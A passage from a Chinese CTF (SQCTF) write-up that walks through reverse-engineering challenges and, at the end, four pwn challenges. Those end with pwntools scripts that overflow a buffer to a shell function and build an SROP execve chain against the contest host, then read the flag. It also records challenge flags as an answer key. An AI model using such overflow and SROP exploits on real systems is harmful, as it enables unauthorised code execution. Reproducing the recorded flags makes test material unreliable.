if __name__ == "__main__":
    main()
```

SQCTF\{nihaobuhaobuhaoxixi\}

## 即随本心

还是pyinstaller打包的exe  
pyinstxtractor解包后反编译pyc只能得到部分内容，不过完全够用了  
AES加密

```python
key = b'1234567890abcdef'
iv = b'1234567890abcdef'
expected_encrypted_data = 'MTIzNDU2Nzg5MGFiY2RlZpOn0SHxbVMvaa7jQztMCBtCCiuX+ZRBzSfcL01St5Bmi8BjGeuXliictrjqzSpCGw=='
```

这些是关键内容，直接丢给cyberchef一把梭

得到`SQCTF{qianniananshi_yidengjiming}`

## 唧唧复唧唧，木兰当户织

逆向得到base64  
直接解得到SQCTF\{xixibuxixi，mulandanghuzhi\}  
把逗号改成半角逗号就行了  
SQCTF\{xixibuxixi,mulandanghuzhi\}

## 看山不是山

依旧是pyinstaller打包的exe  
pyinstxtractor解包后反编译得到：

```python
def encrypt(data):
    result = []
    key = 439041101
    for i in range(len(data)):
        byte = data[i]
        byte = (byte ^ key >> (i % 4) * 8) & 255
        byte = byte + i & 255
        result.append(byte)
    return bytes(result)

def check(data):
    target = bytes.fromhex('738495a6b7c8d9e0f123456789abcdef')
    if len(data) != 16:
        return False
    encrypted = None(data)
    return encrypted == target
```

解码：

```python
def decrypt(encrypted):
    key = 439041101
    key_bytes = [(key >> (shift * 8)) & 0xFF for shift in [0, 1, 2, 3]]
    result = []
    for i in range(len(encrypted)):
        kb = key_bytes[i % 4]
        byte = (encrypted[i] - i) % 256
        byte ^= kb
        result.append(byte)
    return bytes(result)

# 目标加密值
target = bytes.fromhex('738495a6b7c8d9e0f123456789abcdef')
# 解密得到原始数据
original = decrypt(target)
print("Flag:", original.hex())
```

SQCTF\{3ebfb8b9fefff8c3a426104630a294fa\}

## ezRe

pyinstxtractor解包后反编译pyc得到下面的内容

```python
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
# Version : Python 3.9

import base64
encoded_flag = 'NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0'
flag = base64.b64decode(encoded_flag).decode('utf-8')
print(flag)
```

把`NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0`base64解码一下就能得到flag内容，然后与SQCTF\{\}拼合一下

SQCTF\{5ed2be45-2e83-48d2-b631-c088e51ee964\}

## 慕然回首，那人却在灯火阑珊处

ida打开发现有个maze数组

进hex里看一下，提出来迷宫

```
S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############
```

gemini写的，直接上解题脚本

```python
from collections import deque

maze_string = "S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############"
maze_grid = [list(maze_string[i:i+10]) for i in range(0, 100, 10)]

def is_valid(r, c):
    return 0 <= r < 10 and 0 <= c < 10

def solve():
    start_pos = None
    end_pos = None
    for r in range(10):
        for c in range(10):
            if maze_grid[r][c] == 'S':
                start_pos = (r, c)
            elif maze_grid[r][c] == 'E':
                end_pos = (r, c)

    if not start_pos or not end_pos:
        return None

    start_r, start_c = start_pos
    end_r, end_c = end_pos

    queue = deque([(start_r, start_c, "")])
    visited = set([(start_r, start_c)])

    while queue:
        r, c, path = queue.popleft()

        if r == end_r and c == end_c:
            return path

        # Move right 'd'
        new_r, new_c = r, c + 1
        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != '#' and (new_r, new_c) not in visited:
            visited.add((new_r, new_c))
            queue.append((new_r, new_c, path + 'd'))

        # Move down 's'
        new_r, new_c = r + 1, c
        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != '#' and (new_r, new_c) not in visited:
            visited.add((new_r, new_c))
            queue.append((new_r, new_c, path + 's'))

        # Move up 'w'
        new_r, new_c = r - 1, c
        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != '#' and (new_r, new_c) not in visited:
            visited.add((new_r, new_c))
            queue.append((new_r, new_c, path + 'w'))

        # Move left 'a'
        new_r, new_c = r, c - 1
        if is_valid(new_r, new_c) and maze_grid[new_r][new_c] != '#' and (new_r, new_c) not in visited:
            visited.add((new_r, new_c))
            queue.append((new_r, new_c, path + 'a'))

    return None

path = solve()
if path:
    flag = f"sqctf{{{path}}}"
    print(flag)
else:
    print("No path found.")
```

sqctf\{ddsssdssaasssddddddwd\}

## 鹅鹅鹅，曲项向天歌

pyinstxtractor解包后反编译pyc得到下面的内容

```python
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
# Version : Python 3.10

def verification():
    part1 = 'flag{'
    part2 = 'xxxxxxxxxxxxxxxxxxxxxxx'
    part3 = '}'
    tmp = ''
    part2_1 = part2[:7]
    part2_2 = part2[7:20]
    part2_3 = part2[20:]
    for i in range(len(part2_1)):
        tmp += chr(ord(part2_1[i]) + 5)
    for i in range(len(part2_2)):
        tmp += chr(ord(part2_2[i]) + 0)
    for i in range(len(part2_3)):
        tmp += chr(ord(part2_3[i]) - 7)
    ciphertext = 'itd~tzw_know_sanmenxbZ8'
    true_flag = part1 + part2 + part3
```

写个脚本逆向一下

```python
def decrypt(ciphertext):
    # 分割密文
    part2_1 = ciphertext[:7]
    part2_2 = ciphertext[7:20]
    part2_3 = ciphertext[20:]

    # 解密每个部分
    decrypted_part2_1 = ''.join(chr(ord(char) - 5) for char in part2_1)
    decrypted_part2_2 = ''.join(chr(ord(char) - 0) for char in part2_2)
    decrypted_part2_3 = ''.join(chr(ord(char) + 7) for char in part2_3)

    # 合并解密后的部分
    decrypted_part2 = decrypted_part2_1 + decrypted_part2_2 + decrypted_part2_3
    return decrypted_part2

# 给定的密文
ciphertext = 'itd~tzw_know_sanmenxbZ8'

# 解密得到part2
decrypted_part2 = decrypt(ciphertext)

# 构造完整的flag
flag = f'flag{{{decrypted_part2}}}'
flag
```

flag\{do\_your\_know\_sanmenxia?\}

## 圣人当仁不让

ida反编译看一下算法

实现了一个简单的字节操作函数，其功能是对输入的字符数组进行一系列的位运算。具体来说，对于数组中的每个元素，它先与0xAA进行异或操作，然后加5，再减2。这个操作对数组的前16个元素（0x10表示16）进行，然后对输出的内容做了base64加密

那就逆向一下这个操作

```python
import base64

# Base64 encoded string
encoded_str = "/P7sAe/U0s7c1vjb0vjfyt=="

# Decode the string
decoded_bytes = base64.b64decode(encoded_str)

output_bytes = bytearray()

for byte in decoded_bytes:
    reversed_byte = ((byte + 2) % 256 - 5) % 256 ^ 0xAA
    output_bytes.append(reversed_byte)

# 输出结果
output_bytes
```

得到flag

SQCTF\{easy\_re\_vm\}

## 往事暗沉不可追

pyinstxtractor解包后反编译pyc得到下面的内容

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.10

class SimpleVM:
    
    def __init__(self):
        self.memory = [
            0] * 256
        self.registers = [
            0] * 16

    
    def load(self, reg, addr):
        self.registers[reg] = self.memory[addr]

    
    def store(self, reg, addr):
        self.memory[addr] = self.registers[reg]

    
    def xor(self, reg, value):
        self.registers[reg] ^= value

    
    def execute(self, bytecode):
        ip = 0
        if ip < len(bytecode):
            op = bytecode[ip]
            if op == 'LOAD':
                reg = bytecode[ip + 1]
                addr = bytecode[ip + 2]
                self.load(reg, addr)
                ip += 3
            elif op == 'STORE':
                reg = bytecode[ip + 1]
                addr = bytecode[ip + 2]
                self.store(reg, addr)
                ip += 3
            elif op == 'XOR':
                reg = bytecode[ip + 1]
                value = bytecode[ip + 2]
                self.xor(reg, value)
                ip += 3
            else:
                raise ValueError(f'''Unknown opcode: {op}''')
            if not None < len(bytecode):
                return None
            return None

    
    def get_memory(self):
        return self.memory

bytecode = [
    'LOAD',
    0,
    16,
    'XOR',
    0,
    85,
    'STORE',
    0,
    32,
    'LOAD',
    1,
    32,
    'XOR',
    1,
    170,
    'STORE',
    1,
    48]
encrypted_data = [
    127,
    131,
    125,
    123,
    135,
    127,
    133,
    123,
    125,
    131,
    127,
    135,
    131,
    123,
    135,
    125]
vm = SimpleVM()
vm.memory[16:16 + len(encrypted_data)] = encrypted_data
vm.execute(bytecode)
final_memory = vm.get_memory()
```

解码脚本

```python
encrypted_data = [
    127,
    131,
    125,
    123,
    135,
    127,
    133,
    123,
    125,
    131,
    127,
    135,
    131,
    123,
    135,
    125]

# Step 1: XOR with 170 to reverse the second XOR operation
step1_decrypted = [data ^ 170 for data in encrypted_data]

# Step 2: XOR with 85 to reverse the first XOR operation
decrypted_data = [data ^ 85 for data in step1_decrypted]

# Convert decrypted numbers to ASCII characters
decrypted_string = ''.join(chr(data) for data in decrypted_data)

print("Decrypted Data (Numbers):", decrypted_data)
```

Decrypted Data (Numbers): [128, 124, 130, 132, 120, 128, 122, 132, 130, 124, 128, 120, 124, 132, 120, 130]

flag就是SQCTF\{128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130\}

# Pwn 解出4题

## 浅红欺醉粉，肯信有江梅

nc连接即可拿到shell

```bash
ls
cat flag
```

sqctf\{24fee39487a84431b06db644c829f55c\}

## 领取你的小猫娘

不用pwntool，直接nc连上去，灌进去77个A即可拿到shell

```bash
ls
cat flag
```

sqctf\{f89de5c863644168b7f9de37372ac1c7\}

## 江南无所有，聊赠一枝春

开了NX，不过没关系，照样打

ida看一下，64个字节长的v4，还有8字节长的RBP寄存器，都需要覆盖掉

也就是需要发送72字节的垃圾数据，然后才能跟地址

```python
from pwn import *

context(arch='amd64', os='linux')
p=remote('challenge.qsnctf.com',30042)
payload = b'A'*72
shell_address = 0x4011D7
payload += p64(shell_address)

p.sendline(payload)
p.interactive()
```

```bash
ls /
cat /flag
```

sqctf\{12f7861090ed42fda6c14dde2ad98caa\}

## 当时只道是寻常

这个题出的很有水平，需要构造SROP链

ida逆向，看到给了一个8字节的v3数组，read读了1024字节长，而且只有pop rax; ret这一个可用的gadget和程序里一个地址内存放着的binsh字符串

很标准的srop题了。

直接上payload

```python
from pwn import *

target = './pwn01'

context(arch='amd64', os='linux')

binsh_addr = 0x40203A
pop_rax_ret_addr = 0x40104A
syscall_addr = 0x40101D

rt_sigreturn = 15

execve_syscall = 59

offset_ret = 8

p = process(target)
p= remote('challenge.qsnctf.com',31620)

payload = b'A'* offset_ret
payload += p64(pop_rax_ret_addr)
payload += p64(rt_sigreturn)
payload += p64(syscall_addr)

frame = SigreturnFrame()
frame.rax = execve_syscall
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload += bytes(frame)

p.sendline(payload)

p.interactive()
```

```bash
ls /
cat /flag
```

sqctf\{c14afe377c974cf6b9d380a91ac72095\}
